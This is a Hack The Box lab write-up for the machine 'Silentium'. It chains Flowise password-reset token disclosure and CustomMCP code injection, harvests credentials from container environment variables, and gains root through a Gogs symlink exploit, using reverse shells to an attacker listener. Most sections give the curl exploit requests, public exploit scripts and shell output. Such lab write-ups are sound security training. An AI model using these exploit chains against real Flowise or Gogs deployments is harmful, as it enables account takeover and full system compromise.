# Silentium — Hack The Box Writeup

**Machine:** Silentium 

**OS:** Linux 

**Difficulty:** Easy 

**Status:** Retired 

**Date Completed:** April 2026 

---

## Summary

Silentium is an Easy Linux machine centered around a chain of recent, actively exploited CVEs in two AI/DevOps platforms. Initial access is achieved by chaining CVE-2025-58434 (unauthenticated password reset token disclosure in Flowise) with CVE-2025-59528 (CustomMCP JavaScript injection RCE), landing a shell inside a Docker container as root. Container enumeration reveals credentials in environment variables, one of which is reused for SSH access to the host. Privilege escalation exploits CVE-2025-8110 (symlink path traversal in Gogs PutContents API) running as root, overwriting a git config to inject a reverse shell.

**Key techniques:** Vhost enumeration · CVE-2025-58434 (Flowise ATO) · CVE-2025-59528 (Flowise CustomMCP RCE) · Docker container enumeration · Environment variable credential harvesting · CVE-2025-8110 (Gogs symlink RCE)

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.19.86 -Pn
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

Two services: SSH and a web server redirecting to `silentium.htb`. Added to `/etc/hosts` and browsed to the main site.

---

## Enumeration

### Main Site

The main site presents a corporate financial firm. No functional links, but the staff section lists three names:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems (no surname — potential username hint)
- **Elena Rossi** — Chief Risk Officer

### Vhost Enumeration

Directory enumeration on `silentium.htb` found only `/assets` after filtering the wildcard response length:

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --exclude-length 8753
```

Vhost enumeration (run in parallel) revealed a subdomain:

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain --exclude-length 8753
```

```
staging.silentium.htb  Status: 200  [Size: 3142]
```

Added `staging.silentium.htb` to `/etc/hosts`. Browsing to it redirected to `/signin` — a **Flowise** login page ("Build AI Agents, Visually").

### Flowise Version Fingerprinting

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

Flowise 3.0.5 is vulnerable to two chained CVEs.

---

## Initial Access — Flowise CVE Chain

### CVE-2025-58434: Unauthenticated Password Reset Token Disclosure

The `/api/v1/account/forgot-password` endpoint returns the full user object including a `tempToken` in the response body without any authentication — a critical information disclosure. Testing with the staff name hint:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "z9VV9AW5ZWtx5XoKiJY0c86PjXBO4JmkRu8XfCycZ2O8E87gsi5nBdXMkmrhm7nG",
    "tokenExpiry": "2026-04-12T09:39:57.792Z",
    ...
  }
}
```

The `tempToken` can immediately be used to reset the password:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"Pwn3d!2026"}}'
```

Login to `http://staging.silentium.htb/signin` with `ben@silentium.htb` / `Pwn3d!2026` succeeded, giving full admin access to the Flowise dashboard.

### CVE-2025-59528: CustomMCP JavaScript Injection RCE

Flowise 3.0.5 passes the `mcpServerConfig` parameter of the CustomMCP node directly to a `Function()` constructor without sanitization, granting full Node.js runtime privileges. The endpoint requires authentication but we now have admin access.

Using the exploit chain script `CVE-2025-58434-59528`:

```bash
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528.git
cd CVE-2025-58434-59528
pip install requests
python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb
```

The script automatically:
1. Leaks the reset token via CVE-2025-58434
2. Resets the password
3. Prompts to grab an API key from the UI
4. Triggers RCE via CVE-2025-59528 using the mkfifo reverse shell payload

After pasting the API key and setting LHOST/LPORT with a listener running:

```bash
nc -lvnp 4444
```

```
connect to [10.10.14.83] from (UNKNOWN) [10.129.19.105] 40667
/bin/sh: can't access tty; job control will be turned off
/ # whoami
root
```

Shell obtained as root inside a Docker container.

---

## Container Enumeration

The `.dockerenv` file confirmed the Docker environment. The container runs Alpine Linux.

```bash
cat /root/.ash_history
# env
# exit
```

Running `env` revealed credentials passed as environment variables — a common Docker misconfiguration:

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
SMTP_HOST=mailhog
...
```

Two passwords recovered: `F1l3_d0ck3r` and `r04D!!_R4ge`.

Network enumeration showed the Docker gateway at `172.18.0.1` — the host system.

---

## Lateral Movement — SSH to Host

Testing both passwords against SSH on the target IP:

```bash
ssh ben@10.129.19.142
# Password: r04D!!_R4ge
```

The SMTP password was reused as ben's system account password. Login succeeded.

```bash
cat user.txt
# 4422ea1a5ddcea1ffcdb54cf014f4f81
```

---

## Privilege Escalation — Gogs CVE-2025-8110

### Internal Service Discovery

```bash
ss -tlnp
```

Port 3001 was listening on localhost. Process enumeration showed:

```
root   1372   /opt/gogs/gogs/gogs web
```

Gogs — a self-hosted Git service — running as root.

### Accessing Gogs

SSH port forward to reach the service:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.19.142
```

Added `staging-v2-code.dev.silentium.htb` (from `/opt/gogs/gogs/custom/conf/app.ini`) to `/etc/hosts` and browsed to `http://staging-v2-code.dev.silentium.htb:3001`.

Version confirmed:

```bash
/opt/gogs/gogs/gogs --version
# Gogs version 0.13.3
```

Gogs 0.13.3 is vulnerable to CVE-2025-8110. Open registration was enabled, so a new account (`user123`) was created via the UI.

### CVE-2025-8110: Symlink Path Traversal RCE

CVE-2025-8110 bypasses the path validation fix for CVE-2024-55947. The PutContents API validates filenames but does not check whether the target file is a symbolic link. An attacker can:

1. Create a repository
2. Commit a symlink pointing to a sensitive target outside the repo (e.g., `.git/config` of another repo)
3. Use the PutContents API to write through the symlink
4. The OS follows the link and overwrites the external file
5. By injecting a malicious `core.sshCommand` into a git config, arbitrary commands execute as root when a git operation is triggered

Using the PoC from `zAbuQasem/gogs-CVE-2025-8110`, modified to use the existing `user123` account (skipping registration):

```bash
git clone https://github.com/zAbuQasem/gogs-CVE-2025-8110.git
cd gogs-CVE-2025-8110
pip install beautifulsoup4 rich --break-system-packages

git config --global user.email "user123@silentium.htb"
git config --global user.name "user123"
```

With listener running:

```bash
nc -lvnp 5555
```

```bash
python3 CVE-2025-8110.py \
  -u http://staging-v2-code.dev.silentium.htb:3001 \
  -lh 10.10.14.83 \
  -lp 5555
```

```
[+] Authenticated successfully
[+] Application token: f050f40c...
Repo creation status: 201
[master ae7126f] Add malicious symlink
[+] Exploit sent, check your listener!
```

```
connect to [10.10.14.83] from (UNKNOWN) [10.129.19.142] 50218
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/12# whoami
root
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/12# cat /root/root.txt
# f17625a306caca7738353d4cacf265f2
```


---

<img width="1194" height="682" alt="Screenshot 2026-04-28 103805" src="https://github.com/user-attachments/assets/ac04431d-e219-44f0-a76a-71cf6729a7ad" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| CVE-2025-58434 — Password reset token disclosure | Flowise `/api/v1/account/forgot-password` | Unauthenticated account takeover |
| CVE-2025-59528 — CustomMCP JS injection | Flowise `/api/v1/node-load-method/customMCP` | Authenticated RCE as container root |
| Credentials in Docker environment variables | Container `env` output | SSH password for host user ben |
| Password reuse | SMTP password reused as SSH password | Lateral movement to host |
| CVE-2025-8110 — Gogs symlink path traversal | Gogs PutContents API | RCE as root via git config injection |

---

## Key Takeaways

- **Vhost enumeration is mandatory from the start** — `staging.silentium.htb` was the entire attack surface and would have been missed without it running alongside directory enumeration
- **API endpoints leak more than UI flows** — the forgot-password API returned the full user object including the reset token, something the UI abstracts away entirely
- **Docker environment variables are a high-value target** — credentials passed via `env` are trivially readable from any process inside the container and frequently reused on the host
- **Never assume a credential is single-purpose** — the SMTP password `r04D!!_R4ge` doubled as ben's SSH password; always test recovered credentials across all available services
- **Running internal services as root compounds CVE severity** — CVE-2025-8110 in isolation is a file overwrite; with Gogs running as root it becomes immediate system compromise
- **Check the version before assuming an exploit won't work** — CVE-2025-8110 affects all Gogs ≤ 0.13.3, and 0.13.3 was the exact version running

---

*Part of my HTB writeup series — [back to portfolio](https://github.com/Egio7)*
